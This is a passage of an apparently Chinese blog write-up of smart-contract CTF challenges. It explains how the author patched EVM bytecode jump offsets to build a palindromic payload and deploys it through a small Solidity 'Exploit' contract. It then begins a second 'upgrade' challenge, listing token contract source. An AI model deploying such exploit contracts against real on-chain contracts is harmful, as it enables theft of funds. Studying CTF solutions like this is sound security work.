operator\">:</span>\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002abcd000000000000000000000000000000000000000000000000000000000000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015003807535.png\"></p>\n<p>发现首先用32字节记录了length，之后在再存储了code，所以在opcode之前有0x20的length</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015004431427.png\"></p>\n<p>再继续向下分析，for循环执行时，判断条件是否为真，为假则退出循环，而这部分我们查看自己的opcode发现并没有指定位置，我们去寻找退出循环的JUMPDEST为第38位，也就是0x26,这里的0x2a是错误的，进行修改</p>\n<p>再次向下分析，执行完for循环中的内容之后，会执行JUMP无条件跳转，所以我们这里应该是跳转到for循环的开始，也就是第一个JUMPDEST，在opcode中是第七位，而这里执行的却是PUSH1 0x18，显然是不对的，将这里的push值改成0x07</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015011445437.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015014702106.png\"></p>\n<p>（ps：JUMP1以及JUMP的释义如上两图）</p>\n<p>最终得到修改后的code</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3\n倒置拼接之后得到结果：\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\n或：\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到结果之后进行攻击合约部署即可</p>\n<h2 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>Setup setup<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// setup.challenge().deploy(hex\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\");</span>\n        setup<span class=\"token punctuation\">.</span><span class=\"token function\">challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>hex<span class=\"token string\">\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>setup<span class=\"token punctuation\">.</span><span class=\"token function\">challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>setup<span class=\"token punctuation\">.</span><span class=\"token function\">challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">rev</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>部署合约，进行测试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015015532199.png\"></p>\n<p>python生成的随机数中第一种情况</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015203658141.png\"></p>\n<p>第二种情况</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221015015648030.png\"></p>\n<p>测试正确，完成挑战！</p>\n<h1 id=\"2-upgrade\"><a href=\"#2-upgrade\" class=\"headerlink\" title=\"2.upgrade\"></a>2.upgrade</h1><details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">>=</span> a<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SafeMath: addition overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SafeMath: subtraction overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">&lt;=</span> a<span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span>\n        <span class=\"token comment\">// benefit is lost if 'b' is also tested.</span>\n        <span class=\"token comment\">// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">/</span> a <span class=\"token operator\">==</span> b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SafeMath: multiplication overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SafeMath: division by zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">/</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span>\n\n        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SafeMath: modulo by zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IERC20</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @dev Returns the amount of tokens in existence.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the amount of tokens owned by `account`.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is\n     * zero by default.\n     *\n     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        <span class=\"token keyword\">view</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an &#123;Approval&#125; event.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> amount\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">AbstractFiatTokenV1</span> <span class=\"token keyword\">is</span> IERC20 <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Ownable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// Owner of the contract</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Event to show ownership has been transferred\n     * @param previousOwner representing the address of the previous owner\n     * @param newOwner representing the address of the new owner\n     */</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">OwnershipTransferred</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> previousOwner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> newOwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev The constructor sets the original owner of the contract to the sender account.\n     */</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setOwner</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Tells the address of the owner\n     * @return the address of the owner\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Sets a new owner address\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newOwner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        _owner <span class=\"token operator\">=</span> newOwner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Throws if called by any account other than the owner.\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> _owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ownable: caller is not the owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferOwnership</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newOwner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newOwner <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Ownable: new owner is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">OwnershipTransferred</span><span class=\"token punctuation\">(</span>_owner<span class=\"token punctuation\">,</span> newOwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setOwner</span><span class=\"token punctuation\">(</span>newOwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Pausable</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Unpause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">PauserChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> newAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> pauser<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> paused <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Modifier to make a function callable only when the contract is not paused.\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">whenNotPaused</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>paused<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Pausable: paused\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token 